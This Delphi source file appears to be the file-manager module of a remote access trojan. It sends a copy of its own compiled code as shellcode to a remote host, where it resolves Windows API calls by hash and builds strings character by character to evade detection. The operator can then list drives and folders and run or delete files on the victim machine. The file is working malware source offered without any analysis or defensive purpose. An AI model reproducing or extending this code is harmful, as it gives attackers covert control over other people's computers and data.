unit untFilemanager;

interface

uses
  Winapi.Windows, Winapi.Messages, System.SysUtils, System.Variants, System.Classes, Vcl.Graphics,
  Vcl.Controls, Vcl.Forms, Vcl.Dialogs, Vcl.ExtCtrls, Vcl.ComCtrls,
  System.ImageList, Vcl.ImgList, Vcl.StdCtrls, untUtils, untClientObject,
  Vcl.Menus;

type
  TForm2 = class(TForm)
    Panel1: TPanel;
    btnBack: TButton;
    ImageList1: TImageList;
    btnRefresh: TButton;
    lstFiles: TListView;
    Panel2: TPanel;
    Splitter1: TSplitter;
    ListView2: TListView;
    edtPath: TEdit;
    cmbDrives: TComboBoxEx;
    PopupMenu1: TPopupMenu;
    ExecuteFile1: TMenuItem;
    DeleteFile1: TMenuItem;
    CopyFile1: TMenuItem;
    CopyFile2: TMenuItem;
    PasteFile1: TMenuItem;
    procedure cmbDrivesChange(Sender: TObject);
    procedure lstFilesCompare(Sender: TObject; Item1, Item2: TListItem;
      Data: Integer; var Compare: Integer);
    procedure lstFilesDblClick(Sender: TObject);
    procedure btnBackClick(Sender: TObject);
    procedure btnRefreshClick(Sender: TObject);
    procedure ExecuteFile1Click(Sender: TObject);
    procedure DeleteFile1Click(Sender: TObject);
    procedure CopyFile1Click(Sender: TObject);
    procedure PasteFile1Click(Sender: TObject);
  private
    { Private-Deklarationen }
  public
    { Public-Deklarationen }
    mClientThread:TClientThread;
    procedure InitializeForm(pClientThread:TClientThread);
    procedure ProcessCommand(bCMD:Byte; strData:String);
    procedure SendListDirectories(strData:String);
    procedure SendOperation(strID, strData:String);
  end;

var
  Form2: TForm2;

procedure Filemanager(pConn:PConnRec; pData:Pointer; dwLen:Cardinal);stdcall;

implementation

uses
  untCommands, untUtil, untControl;
{$R *.dfm}
procedure Filemanager_CALL(pConn:PConnRec; pData:Pointer; dwLen:Cardinal);stdcall;
begin
  Filemanager(pConn, pData, dwLen);
end;

procedure pSendList(pConn:PConnRec; mBuff:PWideChar);
var
  szDirectory, szFileInfo:Array[0..MAX_PATH] of WideChar;
  lpszSendBuffer:Pointer;
  iFullLen: Integer;
  hFindHandle:Cardinal;
  SearchRec: TWIN32FindDataW;
  sP: Array[0..5] of Char;
  sD: Array[0..9] of Char;
  i64DiskSize: Int64;
  xFindFirstFileW:function(lpFileName: LPCWSTR; var lpFindFileData: TWIN32FindDataW): THandle; stdcall;
  xFindNextFileW:function(hFindFile: THandle; var lpFindFileData: TWIN32FindDataW): BOOL; stdcall;
  xFindClose:function(hFindFile: THandle): BOOL; stdcall;
  xGetDiskFreeSpaceExW:function(lpDirectoryName: LPCWSTR; var lpFreeBytesAvailableToCaller, lpTotalNumberOfBytes; lpTotalNumberOfFreeBytes: PLargeInteger): BOOL; stdcall;
begin
  xFindFirstFileW := pConn.pAPI.xGetProcAddressEx(pConn.pAPI.hKernel32, $3D3F609F, 14);
  xFindNextFileW := pConn.pAPI.xGetProcAddressEx(pConn.pAPI.hKernel32, $81F39C19, 13);
  xFindClose := pConn.pAPI.xGetProcAddressEx(pConn.pAPI.hKernel32, $D82BF69A, 9);
  xGetDiskFreeSpaceExW := pConn.pAPI.xGetProcAddressEx(pConn.pAPI.hKernel32, $62158DB7, 19);

  sP[0]:='%';sP[1]:='s';sP[2]:='*';sP[3]:='.';sP[4]:='*';sP[5]:=#0;
  sD[0]:='%';sD[1]:='s';sD[2]:='*';sD[3]:='%';sD[4]:='d';sD[5]:='*';sD[6]:='%';sD[7]:='d';sD[8]:='|';sD[9]:=#0;
  if (pConn.pAPI.xlstrlenW(mBuff) = 3) then
  begin
    if Not xGetDiskFreeSpaceExW(mBuff, i64DiskSize, i64DiskSize, nil) then
    begin
      pConn.xSendBuffer(pConn, CMD_LIST_DIR_ERROR, nil, 1, False);
      Exit;
    end;
  end;

  pConn.pAPI.xwsprintfW(szDirectory, @sP[0], mBuff);

  lpszSendBuffer := pConn.pAPI.xAllocMem(pConn.pAPI, 8192);
  if (lpszSendBuffer <> nil) then
  begin
    hFindHandle := xFindFirstFileW(szDirectory, SearchRec);
    if (hFindHandle <> INVALID_HANDLE_VALUE) then
    begin
      pConn.xSendBuffer(pConn, CMD_LIST_DIR_START, nil, 1, False);
      repeat
        pConn.pAPI.xwsprintfW(szFileInfo, @sD[0],SearchRec.cFileName, SearchRec.nFileSizeLow, SearchRec.dwFileAttributes);
        pConn.pAPI.xlstrcatW(lpszSendBuffer, szFileInfo);
        iFullLen := pConn.pAPI.xlstrlenW(lpszSendBuffer);
        if (iFullLen > 1800) then
        begin
          pConn.xSendBuffer(pConn, CMD_LIST_DIR_WRITE, lpszSendBuffer, (iFullLen * 2), False);
          iFullLen := 0;
          pConn.pAPI.xZeroMemory(lpszSendBuffer^, 8192);
        end;
      until (Not xFindNextFileW(hFindHandle, SearchRec));

      if (iFullLen <> 0) then
        pConn.xSendBuffer(pConn, CMD_LIST_DIR_WRITE, lpszSendBuffer,  (iFullLen * 2), False);

      xFindClose(hFindHandle);
      pConn.xSendBuffer(pConn, CMD_LIST_DIR_FINISHED, nil, 1, False);
    end else
    begin
      pConn.xSendBuffer(pConn, CMD_LIST_DIR_ERROR, nil, 1, False);
    end;
    pConn.pAPI.xFreeMem(pConn.pAPI, lpszSendBuffer);
  end;

end;

procedure pListDrives(pConn:PConnRec);stdcall;
var
  lpszDrive: PChar;
  szBuffer: Array[0..MAX_PATH] Of Char;

  szDriveListBuffer: Array[0..1023] Of Char;
  szDriveInfo: Array[0..15] Of Char;
  iCount, iLoop, iType: Integer;
  xGetLogicalDriveStringsW:function(nBufferLength: DWORD; lpBuffer: LPWSTR): DWORD; stdcall;
  xGetDriveTypeW:function(lpRootPathName: LPCWSTR): UINT; stdcall;
  strPattern:Array[0..6] of Char;
begin
  xGetLogicalDriveStringsW := pConn.pAPI.xGetProcAddressEx(pConn.pAPI.hKernel32, $A0F5D331, 23);
  xGetDriveTypeW := pConn.pAPI.xGetProcAddressEx(pConn.pAPI.hKernel32, $0271D201, 13);
  strPattern[0]:='%';strPattern[1]:='s';strPattern[2]:='|';strPattern[3]:='%';strPattern[4]:='d';strPattern[5]:='#';strPattern[6]:=#0;
  pConn.pAPI.xZeroMemory(szDriveListBuffer, SizeOf(szDriveListBuffer));
  pConn.pAPI.xZeroMemory(szDriveInfo, SizeOf(szDriveInfo));
  iCount := xGetLogicalDriveStringsW(MAX_PATH, szBuffer) div 4;
  for iLoop := 0 to iCount - 1 do
  begin
    lpszDrive := PChar(@szBuffer[iLoop * 4]);
    case xGetDriveTypeW(lpszDrive) of
      DRIVE_FIXED:      iType := 1;
      DRIVE_CDROM:      iType := 2;
      DRIVE_REMOVABLE:  iType := 3;
    else
      iType := 1;
    end;
    pConn.pAPI.xwsprintfW(szDriveInfo,@strPattern[0], @lpszDrive[0], iType);
    pConn.pAPI.xlstrcatW(szDriveListBuffer, @szDriveInfo[0]);
  end;
  pConn.xSendBuffer(pConn, CMD_DRIVE_LIST, szDriveListBuffer, pConn.pAPI.xlstrlenW(szDriveListBuffer) * 2, False);
end;

procedure pExecuteFile(pConn:PConnRec; mBuff:PWideChar);
var
  xShellExecuteW:function(hWnd: HWND; Operation, FileName, Parameters, Directory: PWideChar; ShowCmd: Integer): HINST; stdcall;
begin
  xShellExecuteW := pConn.pAPI.xGetProcAddressEx(pConn.pAPI.hShell32, $1FA8A1D9, 13);
  if xShellExecuteW(0, nil, mBuff, nil, nil, SW_SHOW) > 32 then
    pConn.xSendBuffer(pConn, CMD_FILE_EXECUTE_OK, nil, 1, False)
  else
    pConn.xSendBuffer(pConn, CMD_FILE_EXECUTE_FAIL, nil, 1, False);
end;

procedure pDeleteFile(pConn:PConnRec; mBuff:PWideChar);
var
  xDeleteFileW:function(lpFileName: LPCWSTR): BOOL; stdcall;
begin
  xDeleteFileW := pConn.pAPI.xGetProcAddressEx(pConn.pAPI.hKernel32, $654FDE9A, 11);
  if xDeleteFileW(mBuff) then
    pConn.xSendBuffer(pConn, CMD_FILE_DELETE_OK, nil, 1, False)
  else
    pConn.xSendBuffer(pConn, CMD_FILE_DELETE_FAIL, nil, 1, False);
end;

procedure pRenameFile(pConn:PConnRec; mBuff:PWideChar);
begin
  pConn.pAPI.xMessageBoxW(0,mBuff,nil,0);
end;

procedure pCopyFile(pConn:PConnRec; mBuff:PWideChar);
begin
  pConn.pAPI.xMessageBoxW(0,mBuff,nil,0);
end;

procedure Filemanager(pConn:PConnRec; pData:Pointer; dwLen:Cardinal);stdcall;
var
  bCMD:Char;
  pPath:PWideChar;
begin
  bCMD := PChar(pData)^;
  pConn.pAPI.xMessageBoxW(0,pData,nil,0);
  pPath := Pointer(DWORD(pData) + SizeOf(Char));
  if bCMD = 'A' then
    pListDrives(pConn)
  else if bCMD = 'B' then
    pSendList(pConn, pPath)
  else if bCMD = 'C' then
    pExecuteFile(pConn, pPath)
  else if bCMD = 'D' then
    pDeleteFile(pConn, pPath)
  else if bCMD = 'E' then
    pRenameFile(pConn, pPath)
  else if bCMD = 'F' then
    pCopyFile(pConn, pPath);
end;
procedure Filemanager_END();begin end;

procedure TForm2.PasteFile1Click(Sender: TObject);
begin
  if lstFiles.Selected <> nil then
  begin
    if lstFiles.Selected.SubItems[1] <> 'Directory' then
    begin
      SendOperation('F', edtPath.Text + lstFiles.Selected.Caption);
    end;
  end;
end;

procedure TForm2.ProcessCommand(bCMD:Byte; strData:String);
var
  lstTokens, lstTokenTokens:TStringList;
  i:Integer;
  c:Cardinal;
  cmbItem:TComboExItem;
  lstItem:TListItem;
begin
  case bCMD of
    CMD_DRIVE_LIST:
      begin
        cmbDrives.Clear;
        lstTokens := Explode('#', strData);
        for I := 0 to lstTokens.Count - 1 do
        begin
          lstTokenTokens := Explode('|', lstTokens[i]);
          cmbItem := cmbDrives.ItemsEx.Add;
          cmbItem.Caption := lstTokenTokens[0];
          if lstTokenTokens[1] = '1' then
            cmbItem.ImageIndex := 2
          else if lstTokenTokens[1] = '2' then
            cmbItem.ImageIndex := 3
          else
            cmbItem.ImageIndex := 4;
          lstTokenTokens.Free;
        end;
        lstTokens.Free;
      end;
    CMD_LIST_DIR_START:
      begin
        lstFiles.Clear;
        lstFiles.Items.BeginUpdate;
        TForm3(mClientThread.frmControl).StatusBar1.SimpleText := 'Listing files...';
      end;
    CMD_LIST_DIR_WRITE:
      begin
        lstTokens := Explode('|', strData);
        for I := 0 to lstTokens.Count - 1 do
        begin
          lstTokenTokens := Explode('*', lstTokens[i]);
          if ((lstTokenTokens[0] = '.') or (lstTokenTokens[0] = '..')) then
            continue;
          lstItem := lstFiles.Items.Add;
          lstItem.Caption := lstTokenTokens[0];
          c := strToInt(lstTokenTokens[2]);
          if ((c and FILE_ATTRIBUTE_DIRECTORY) <> 0) then
          begin
            lstItem.SubItems.Add(GetFileAttributes(StrToInt(lstTokenTokens[2])));
            lstItem.SubItems.Add('Directory');
            lstItem.ImageIndex := 5;
          end else
          begin
            lstItem.SubItems.Add(GetFileAttributes(StrToInt(lstTokenTokens[2])));
            lstItem.SubItems.Add(FormatByteSize(StrToInt(lstTokenTokens[1])));
            lstItem.ImageIndex := 6;
          end;
          lstTokenTokens.Free;
        end;
        lstTokens.Free;
      end;
    CMD_LIST_DIR_FINISHED:
      begin
        lstFiles.Items.EndUpdate;
        TForm3(mClientThread.frmControl).StatusBar1.SimpleText := 'Files listed!';
      end;
    CMD_LIST_DIR_ERROR:
      begin
        lstFiles.Clear;
        TForm3(mClientThread.frmControl).StatusBar1.SimpleText := 'Cant access folder!';
      end;
    CMD_FILE_DELETE_OK:
      begin
        SendListDirectories(edtPath.Text);
      end;
    CMD_FILE_DELETE_FAIL:
      begin
        SendListDirectories(edtPath.Text);
      end;
    CMD_FILE_EXECUTE_OK:
      begin
        TForm3(mClientThread.frmControl).StatusBar1.SimpleText := 'File executed!';
      end;
    CMD_FILE_EXECUTE_FAIL:
      begin
        TForm3(mClientThread.frmControl).StatusBar1.SimpleText := 'Cant execute file!';
      end;
  end;
end;

procedure TForm2.SendListDirectories(strData:String);
var
  dwProcLen:Cardinal;
  pShell:PShellCode;
begin
  strData := 'B' + strData;
  dwProcLen := Length(strData) * 2;
  GetMem(pShell, dwProcLen + SizeOf(TShellCode));
  if pShell <> nil then
  begin
    pShell.dwLen := dwProcLen;
    pShell.dwID := 1;
    CopyMemory(Pointer(DWORD(pShell) + SizeOf(TShellCode) - SizeOf(Pointer)), PChar(strData), pShell.dwLen);
    mClientThread.SendBuffer(CMD_SHELLCODE_CALL,pShell, dwProcLen + SizeOf(TShellCode) - SizeOf(Pointer));
    FreeMem(pShell);
  end;
end;

procedure TForm2.SendOperation(strID, strData:String);
var
  dwProcLen:Cardinal;
  pShell:PShellCode;
begin
  strData := strID + strData;
  dwProcLen := Length(strData) * 2;
  GetMem(pShell, dwProcLen + SizeOf(TShellCode));
  if pShell <> nil then
  begin
    pShell.dwLen := dwProcLen;
    pShell.dwID := 1;
    CopyMemory(Pointer(DWORD(pShell) + SizeOf(TShellCode) - SizeOf(Pointer)), PChar(strData), pShell.dwLen);
    mClientThread.SendBuffer(CMD_SHELLCODE_CALL,pShell, dwProcLen + SizeOf(TShellCode) - SizeOf(Pointer));
    FreeMem(pShell);
  end;
end;

procedure TForm2.btnBackClick(Sender: TObject);
begin
  if Length(edtPath.text) > 3 then
    edtPath.text := ExtractFilePath(Copy(edtPath.text, 1, Length(edtPath.text)-1));
  SendListDirectories(edtPath.Text);
end;

procedure TForm2.btnRefreshClick(Sender: TObject);
begin
  SendListDirectories(edtPath.Text);
end;

procedure TForm2.cmbDrivesChange(Sender: TObject);
var
  strDrive:String;
begin
  if cmbDrives.ItemsEx.Count = 0 then
    exit;
  strDrive := cmbDrives.ItemsEx.Items[cmbDrives.ItemIndex].Caption;
  if strDrive <> '' then
  begin
    strDrive := Copy(strDrive,1,3);
    if Length(strDrive) = 3 then
    begin
      edtPath.Text := strDrive;
      SendListDirectories(strDrive);
    end;
  end;
end;

procedure TForm2.CopyFile1Click(Sender: TObject);
begin
  if lstFiles.Selected <> nil then
  begin
    if lstFiles.Selected.SubItems[1] <> 'Directory' then
    begin
      SendOperation('E', edtPath.Text + lstFiles.Selected.Caption);
    end;
  end;
end;

procedure TForm2.DeleteFile1Click(Sender: TObject);
begin
  if lstFiles.Selected <> nil then
  begin
    if lstFiles.Selected.SubItems[1] <> 'Directory' then
    begin
      SendOperation('D', edtPath.Text + lstFiles.Selected.Caption);
    end;
  end;
end;

procedure TForm2.ExecuteFile1Click(Sender: TObject);
begin
  if lstFiles.Selected <> nil then
  begin
    if lstFiles.Selected.SubItems[1] <> 'Directory' then
    begin
      SendOperation('C', edtPath.Text + lstFiles.Selected.Caption);
    end;
  end;
end;

procedure TForm2.InitializeForm(pClientThread:TClientThread);
var
  dwProcLen:Cardinal;
  pShell:PShellCode;
  bCMD:String;
begin
  mClientThread := pClientThread;
  dwProcLen := DWORD(@Filemanager_END) - DWORD(@Filemanager_CALL);
  GetMem(pShell, dwProcLen + SizeOf(TShellCode));
  if pShell <> nil then
  begin
    pShell.dwLen := dwProcLen;
    pShell.dwID := 1;
    CopyMemory(Pointer(DWORD(pShell) + SizeOf(TShellCode) - SizeOf(Pointer)), @Filemanager_CALL, pShell.dwLen);
    mClientThread.SendBuffer(CMD_SHELLCODE_NEW,pShell,dwProcLen + SizeOf(TShellCode) - SizeOf(Pointer));
    FreeMem(pShell);
  end;

  bCMD :='A';
  dwProcLen := Length(bCMD) * 2;
  GetMem(pShell, dwProcLen + SizeOf(TShellCode));
  if pShell <> nil then
  begin
    pShell.dwLen := dwProcLen;
    pShell.dwID := 1;
    CopyMemory(Pointer(DWORD(pShell) + SizeOf(TShellCode) - SizeOf(Pointer)), PChar(bCMD), pShell.dwLen);
    mClientThread.SendBuffer(CMD_SHELLCODE_CALL,pShell,dwProcLen + SizeOf(TShellCode) - SizeOf(Pointer));
    FreeMem(pShell);
  end;

end;

procedure TForm2.lstFilesCompare(Sender: TObject; Item1, Item2: TListItem;
  Data: Integer; var Compare: Integer);
var
  i:integer;
begin
  i := 1;
  if (Item1.SubItems[i] = 'Directory') then
  begin
    if (Item2.SubItems[i] = 'Directory') then
      Compare := CompareText(Item1.Caption, Item2.Caption)
    else
      Compare := -1;
  end else begin
    if (Item2.SubItems[i] = 'Directory') then
      Compare := 1
    else
      Compare := CompareText(Item1.Caption, Item2.Caption);
  end;
end;

procedure TForm2.lstFilesDblClick(Sender: TObject);
begin
  if lstFiles.Selected <> nil then
  begin
    if lstFiles.Selected.Caption = '..' then
    begin
      if Length(edtPath.text) > 3 then
        edtPath.text := ExtractFilePath(Copy(edtPath.text, 1, Length(edtPath.text)-1));
    end else if lstFiles.Selected.SubItems[1] = 'Directory' then
      edtPath.Text := edtPath.Text + lstFiles.Selected.Caption + '\';
    SendListDirectories(edtPath.Text);
  end;
end;

end.
